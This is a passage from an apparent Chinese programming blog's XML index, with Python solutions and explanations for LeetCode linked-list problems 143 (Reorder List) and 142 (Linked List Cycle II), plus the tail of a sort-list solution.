h.next, i - <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> i: <span class="keyword">break</span> <span class="comment"># no need to merge because the `h2` is None.</span></span><br><span class="line">                h2, i = h, intv</span><br><span class="line">                <span class="keyword">while</span> i <span class="keyword">and</span> h: h, i = h.next, i - <span class="number">1</span></span><br><span class="line">                c1, c2 = intv, intv - i <span class="comment"># the `c2`: length of `h2` can be small than the `intv`.</span></span><br><span class="line">                <span class="comment"># merge the `h1` and `h2`.</span></span><br><span class="line">                <span class="keyword">while</span> c1 <span class="keyword">and</span> c2:</span><br><span class="line">                    <span class="keyword">if</span> h1.val &lt; h2.val: pre.next, h1, c1 = h1, h1.next, c1 - <span class="number">1</span></span><br><span class="line">                    <span class="keyword">else</span>: pre.next, h2, c2 = h2, h2.next, c2 - <span class="number">1</span></span><br><span class="line">                    pre = pre.next</span><br><span class="line">                pre.next = h1 <span class="keyword">if</span> c1 <span class="keyword">else</span> h2</span><br><span class="line">                <span class="keyword">while</span> c1 &gt; <span class="number">0</span> <span class="keyword">or</span> c2 &gt; <span class="number">0</span>: pre, c1, c2 = pre.next, c1 - <span class="number">1</span>, c2 - <span class="number">1</span></span><br><span class="line">                pre.next = h </span><br><span class="line">            intv *= <span class="number">2</span></span><br><span class="line">        <span class="keyword">return</span> res.next</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    head = [<span class="number">-1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">2</span>]</span><br><span class="line">    new_a=createLink_rearinsert(head)</span><br><span class="line">    a1 = Solution()</span><br><span class="line">    p=a1.sortList(new_a)</span><br><span class="line">    list_head=[]</span><br><span class="line">    <span class="keyword">while</span> p!=<span class="literal">None</span>:</span><br><span class="line">        list_head.append(p.val)</span><br><span class="line">        p=p.next</span><br><span class="line">    print(list_head)</span><br></pre></td></tr></table></figure><pre><code>[-1, 0, 2, 3, 4, 5, 6, 7]</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【链表】143.重排链表</title>
      <link href="2020/11/21/LeetCode-A-%E9%93%BE%E8%A1%A8-143.%20%E9%87%8D%E6%8E%92%E9%93%BE%E8%A1%A8/"/>
      <url>2020/11/21/LeetCode-A-%E9%93%BE%E8%A1%A8-143.%20%E9%87%8D%E6%8E%92%E9%93%BE%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<p>链表中点查找、链表反转、链表合并。</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code>给定一个单链表 L：L0→L1→…→Ln-1→Ln ，将其重新排列后变为： L0→Ln→L1→Ln-1→L2→Ln-2→…你不能只是单纯的改变节点内部的值，而是需要实际的进行节点交换。</code></pre><p>示例 1:</p><p>给定链表 1-&gt;2-&gt;3-&gt;4, 重新排列为 1-&gt;4-&gt;2-&gt;3.</p><p>示例 2:</p><p>给定链表 1-&gt;2-&gt;3-&gt;4-&gt;5, 重新排列为 1-&gt;5-&gt;2-&gt;4-&gt;3.</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="方法一：线性表"><a href="#方法一：线性表" class="headerlink" title="方法一：线性表"></a>方法一：线性表</h3><p>因为链表不支持下标访问，所以我们无法随机访问链表中任意位置的元素。</p><p>因此比较容易想到的一个方法是，我们利用线性表存储该链表，然后利用线性表可以下标访问的特点，直接按顺序访问指定元素，重建该链表即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.next = <span class="literal">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createLink_rearinsert</span><span class="params">(lista)</span>:</span></span><br><span class="line">    head = ListNode(<span class="number">-1</span>)</span><br><span class="line">    rear = head</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lista:</span><br><span class="line">        new_node=ListNode(i)</span><br><span class="line">        rear.next=new_node</span><br><span class="line">        rear=new_node</span><br><span class="line">    <span class="keyword">return</span> head.next</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reorderList</span><span class="params">(self, head: ListNode)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> head:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        vec = list()</span><br><span class="line">        node = head</span><br><span class="line">        <span class="keyword">while</span> node:</span><br><span class="line">            vec.append(node)</span><br><span class="line">            node = node.next</span><br><span class="line">        </span><br><span class="line">        i, j = <span class="number">0</span>, len(vec) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; j:</span><br><span class="line">            vec[i].next = vec[j]</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> i == j:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            vec[j].next = vec[i]</span><br><span class="line">            j -= <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        vec[i].next = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span> head</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    head = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">    new_a=createLink_rearinsert(head)</span><br><span class="line">    a1 = Solution()</span><br><span class="line">    p=a1.reorderList(new_a)</span><br><span class="line">    list_head=[]</span><br><span class="line">    <span class="keyword">while</span> p!=<span class="literal">None</span>:</span><br><span class="line">        list_head.append(p.val)</span><br><span class="line">        p=p.next</span><br><span class="line">    print(list_head)</span><br></pre></td></tr></table></figure><pre><code>[1, 4, 2, 3]</code></pre><p>复杂度分析</p><p>时间复杂度：O(N)，其中 N是链表中的节点数。</p><p>空间复杂度：O(N)，其中 N 是链表中的节点数。主要为线性表的开销。</p><h3 id="方法二：寻找链表中点-链表逆序-合并链表"><a href="#方法二：寻找链表中点-链表逆序-合并链表" class="headerlink" title="方法二：寻找链表中点 + 链表逆序 + 合并链表"></a>方法二：寻找链表中点 + 链表逆序 + 合并链表</h3><p>注意到目标链表即为将原链表的左半端和反转后的右半端合并后的结果。</p><p>这样我们的任务即可划分为三步：</p><ul><li>找到原链表的中点<ul><li>我们可以使用快慢指针来 O(N) 地找到链表的中间节点。</li></ul></li><li>将原链表的右半端反转<ul><li>我们可以使用迭代法实现链表的反转。</li></ul></li><li>将原链表的两端合并。<ul><li>因为两链表长度相差不超过 1，因此直接合并即可。</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.next = <span class="literal">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createLink_rearinsert</span><span class="params">(lista)</span>:</span></span><br><span class="line">    head = ListNode(<span class="number">-1</span>)</span><br><span class="line">    rear = head</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lista:</span><br><span class="line">        new_node=ListNode(i)</span><br><span class="line">        rear.next=new_node</span><br><span class="line">        rear=new_node</span><br><span class="line">    <span class="keyword">return</span> head.next</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reorderList</span><span class="params">(self, head: ListNode)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> head <span class="keyword">or</span> <span class="keyword">not</span> head.next:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        tmp_head=ListNode(<span class="number">-1</span>)</span><br><span class="line">        ptr=head</span><br><span class="line">        rear =tmp_head</span><br><span class="line">        </span><br><span class="line">        left_rear,right_start=self.list_in_node(head)</span><br><span class="line">        <span class="comment">#print(left_rear,right_start)</span></span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 若链表结点为奇数，则left_rear=right_start</span></span><br><span class="line">        <span class="keyword">if</span> left_rear==right_start:</span><br><span class="line">            <span class="comment"># 左链表头为ptr</span></span><br><span class="line">            <span class="comment"># 右链表头 right_ptr</span></span><br><span class="line">            right_ptr= self.reverse_link(right_start.next)</span><br><span class="line">            <span class="keyword">while</span> ptr <span class="keyword">and</span> right_ptr:</span><br><span class="line">                rear.next=ptr</span><br><span class="line">                ptr=ptr.next</span><br><span class="line">                rear=rear.next</span><br><span class="line">                </span><br><span class="line">                rear.next=right_ptr</span><br><span class="line">                right_ptr=right_ptr.next</span><br><span class="line">                rear=rear.next</span><br><span class="line"></span><br><span class="line">            rear.next=left_rear</span><br><span class="line">            rear.next.next=<span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right_ptr=self.reverse_link(right_start)</span><br><span class="line">            <span class="keyword">while</span> ptr <span class="keyword">and</span> right_ptr:</span><br><span class="line">                rear.next=ptr</span><br><span class="line">                ptr=ptr.next</span><br><span class="line">                rear=rear.next</span><br><span class="line">                </span><br><span class="line">                rear.next=right_ptr</span><br><span class="line">                right_ptr=right_ptr.next</span><br><span class="line">                rear=rear.next</span><br><span class="line"></span><br><span class="line">            rear.next=<span class="literal">None</span></span><br><span class="line">        head=tmp_head.next</span><br><span class="line">        <span class="keyword">return</span> head</span><br><span class="line">            </span><br><span class="line">    <span class="comment"># 找链表中点</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">list_in_node</span><span class="params">(self,head)</span>:</span></span><br><span class="line">        slow =head</span><br><span class="line">        fast=head.next</span><br><span class="line">        <span class="keyword">while</span> fast!=<span class="literal">None</span> <span class="keyword">and</span> fast.next!=<span class="literal">None</span>: </span><br><span class="line">            fast=fast.next.next</span><br><span class="line">            slow =slow.next</span><br><span class="line">        <span class="comment">#print(slow.val)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> fast:</span><br><span class="line">            left_rear=slow</span><br><span class="line">            right_start=slow</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            left_rear = slow</span><br><span class="line">            right_start=slow.next</span><br><span class="line">        <span class="keyword">return</span> left_rear,right_start</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 链表反转</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverse_link</span><span class="params">(self,head)</span>:</span></span><br><span class="line">        prev=head</span><br><span class="line">        cur=head.next</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> cur!=<span class="literal">None</span>:</span><br><span class="line">            third=cur.next</span><br><span class="line">            cur.next=prev</span><br><span class="line">            prev=cur</span><br><span class="line">            cur=third</span><br><span class="line">        head.next=<span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span> prev</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    head = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">    new_a=createLink_rearinsert(head)</span><br><span class="line">    a1 = Solution()</span><br><span class="line">    p=a1.reorderList(new_a)</span><br><span class="line">    list_head=[]</span><br><span class="line">    <span class="keyword">while</span> p!=<span class="literal">None</span>:</span><br><span class="line">        list_head.append(p.val)</span><br><span class="line">        p=p.next</span><br><span class="line">    print(list_head)</span><br></pre></td></tr></table></figure><pre><code>[1, 5, 2, 4, 3]</code></pre><ul><li>简化</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reorderList</span><span class="params">(self, head: ListNode)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> head:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        mid = self.middleNode(head)</span><br><span class="line">        l1 = head</span><br><span class="line">        l2 = mid.next</span><br><span class="line">        mid.next = <span class="literal">None</span></span><br><span class="line">        l2 = self.reverseList(l2)</span><br><span class="line">        self.mergeList(l1, l2)</span><br><span class="line">        <span class="keyword">return</span> head</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">middleNode</span><span class="params">(self, head: ListNode)</span> -&gt; ListNode:</span></span><br><span class="line">        slow = fast = head</span><br><span class="line">        <span class="keyword">while</span> fast.next <span class="keyword">and</span> fast.next.next:</span><br><span class="line">            slow = slow.next</span><br><span class="line">            fast = fast.next.next</span><br><span class="line">        <span class="keyword">return</span> slow</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverseList</span><span class="params">(self, head: ListNode)</span> -&gt; ListNode:</span></span><br><span class="line">        prev = <span class="literal">None</span></span><br><span class="line">        curr = head</span><br><span class="line">        <span class="keyword">while</span> curr:</span><br><span class="line">            nextTemp = curr.next</span><br><span class="line">            curr.next = prev</span><br><span class="line">            prev = curr</span><br><span class="line">            curr = nextTemp</span><br><span class="line">        <span class="keyword">return</span> prev</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mergeList</span><span class="params">(self, l1: ListNode, l2: ListNode)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> l1 <span class="keyword">and</span> l2:</span><br><span class="line">            l1_tmp = l1.next</span><br><span class="line">            l2_tmp = l2.next</span><br><span class="line"></span><br><span class="line">            l1.next = l2</span><br><span class="line">            l1 = l1_tmp</span><br><span class="line"></span><br><span class="line">            l2.next = l1</span><br><span class="line">            l2 = l2_tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    head = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">    new_a=createLink_rearinsert(head)</span><br><span class="line">    a1 = Solution()</span><br><span class="line">    p=a1.reorderList(new_a)</span><br><span class="line">    list_head=[]</span><br><span class="line">    <span class="keyword">while</span> p!=<span class="literal">None</span>:</span><br><span class="line">        list_head.append(p.val)</span><br><span class="line">        p=p.next</span><br><span class="line">    print(list_head)</span><br></pre></td></tr></table></figure><pre><code>[1, 5, 2, 4, 3]</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【链表】142.环形链表II</title>
      <link href="2020/11/20/LeetCode-A-%E9%93%BE%E8%A1%A8-142.%20%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A8%20II/"/>
      <url>2020/11/20/LeetCode-A-%E9%93%BE%E8%A1%A8-142.%20%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A8%20II/</url>
      
        <content type="html"><![CDATA[<p>返回链表入环开始的第一个节点。</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code>给定一个链表，返回链表开始入环的第一个节点。 如果链表无环，则返回 null。为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。注意，pos 仅仅是用于标识环的情况，并不会作为参数传递到函数中。说明：不允许修改给定的链表。</code></pre><p>进阶：</p><p>你是否可以使用 O(1) 空间解决此题？</p><p>示例1</p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/201119circularlinkedlist.png" align="left"><pre><code>输入：head = [3,2,0,-4], pos = 1输出：返回索引为 1 的链表节点解释：链表中有一个环，其尾部连接到第二个节点</code></pre><p>示例2</p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/201119circularlinkedlist_test2.png" align="left"><pre><code>输入：head = [1,2], pos = 0输出：返回索引为 0 的链表节点解释：链表中有一个环，其尾部连接到第一个节点。</code></pre><p>示例3</p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/201119circularlinkedlist_test3.png" align="left"><pre><code>输入：head = [1], pos = -1输出：返回 null解释：链表中没有环。</code></pre><p>提示：</p><p>链表中节点的数目范围是 $[0, 10^4]$</p><p>$-10^5 &lt;= Node.val &lt;= 10^5$</p><p>pos 为 -1 或者链表中的一个 有效索引 。</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="方法一：哈希表法"><a href="#方法一：哈希表法" class="headerlink" title="方法一：哈希表法"></a>方法一：哈希表法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.next = <span class="literal">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createLink_rearinsert_cycle</span><span class="params">(lista,pos)</span>:</span></span><br><span class="line">    head = ListNode(<span class="number">-1</span>)</span><br><span class="line">    rear = head</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(lista)):</span><br><span class="line">        new_node=ListNode(lista[i])</span><br><span class="line">        <span class="keyword">if</span> i==pos:</span><br><span class="line">            pos_node = new_node</span><br><span class="line">        rear.next=new_node</span><br><span class="line">        rear=new_node</span><br><span class="line">    <span class="keyword">if</span> pos!=<span class="number">-1</span>:</span><br><span class="line">        rear.next=pos_node</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> head.next</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">detectCycle</span><span class="params">(self, head: ListNode)</span> -&gt; ListNode:</span></span><br><span class="line">        seen = set()</span><br><span class="line">        <span class="keyword">while</span> head:</span><br><span class="line">            <span class="keyword">if</span> head <span class="keyword">in</span> seen:</span><br><span class="line">                <span class="keyword">return</span> head</span><br><span class="line">            seen.add(head)</span><br><span class="line">            head = head.next</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    head = [<span class="number">3</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">-4</span>]</span><br><span class="line">    pos = <span class="number">1</span></span><br><span class="line">    new_a=createLink_rearinsert_cycle(head,pos)</span><br><span class="line">    a1 = Solution()</span><br><span class="line">    p=a1.detectCycle(new_a)</span><br><span class="line">    print(p)</span><br></pre></td></tr></table></figure><pre><code>&lt;__main__.ListNode object at 0x000001CED72B6A48&gt;</code></pre><p>复杂度分析</p><p>时间复杂度：O(N)，其中 N 为链表中节点的数目。我们恰好需要访问链表中的每一个节点。</p><p>空间复杂度：O(N)，其中 N 为链表中节点的数目。我们需要将链表中的每个节点都保存在哈希表当中。</p><h3 id="方法二：快慢指针"><a href="#方法二：快慢指针" class="headerlink" title="方法二：快慢指针"></a>方法二：快慢指针</h3><ul><li>思路与算法</li></ul><p>我们使用两个指针，<code>fast</code>和<code>slow</code>。它们起始都位于链表的头部。随后，<code>slow</code>指针每次向后移动一个位置，而 <code>fast</code>指针向后移动两个位置。如果链表中存在环，则 <code>fast</code> 指针最终将再次与 <code>slow</code> 指针在环中相遇。</p><p>如下图所示，设链表中环外部分的长度为 <code>a</code>。<code>slow</code> 指针进入环后，又走了 <code>b</code>的距离与 <code>fast</code> 相遇。此时，<code>fast</code>指针已经走完了环的<code>n</code>圈，因此它走过的总距离为 <code>a+n(b+c)+b=a+(n+1)b+nc</code>。</p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/201120fig1.png"  width='500px'><p>根据题意，任意时刻，<code>fast</code> 指针走过的距离都为 <code>slow</code>指针的 2 倍。因此，我们有</p><p>$a+(n+1)b+nc=2(a+b)⟹a=c+(n−1)(b+c)$</p><p>有了 $a=c+(n-1)(b+c)a=c+(n−1)(b+c)$ 的等量关系，我们会发现：从相遇点到入环点的距离加上 <code>n-1</code> 圈的环长，恰好等于从链表头部到入环点的距离。</p><p>因此，当发现 <code>slow</code> 与 <code>fast</code>相遇时，我们再额外使用一个指针 <code>ptr</code>。起始，它指向链表头部；随后，它和 <code>slow</code> 每次向后移动一个位置。最终，它们会在入环点相遇。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.next = <span class="literal">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createLink_rearinsert_cycle</span><span class="params">(lista,pos)</span>:</span></span><br><span class="line">    head = ListNode(<span class="number">-1</span>)</span><br><span class="line">    rear = head</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(lista)):</span><br><span class="line">        new_node=ListNode(lista[i])</span><br><span class="line">        <span class="keyword">if</span> i==pos:</span><br><span class="line">            pos_node = new_node</span><br><span class="line">        rear.next=new_node</span><br><span class="line">        rear=new_node</span><br><span class="line">    <span class="keyword">if</span> pos!=<span class="number">-1</span>:</span><br><span class="line">        rear.next=pos_node</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> head.next</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">detectCycle</span><span class="params">(self, head: ListNode)</span> -&gt; ListNode:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> head <span class="keyword">or</span> <span class="keyword">not</span> head.next:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        </span><br><span class="line">        slow = head</span><br><span class="line">        fast = head.next</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> slow != fast:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> fast <span class="keyword">or</span> <span class="keyword">not</span> fast.next:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            slow = slow.next</span><br><span class="line">            fast = fast.next.next</span><br><span class="line">        ptr=head</span><br><span class="line">        <span class="keyword">while</span> ptr!=slow.next:</span><br><span class="line">            ptr=ptr.next</span><br><span class="line">            slow=slow.next</span><br><span class="line">        <span class="keyword">return</span> ptr</span><br><span class="line">    </span><br><span 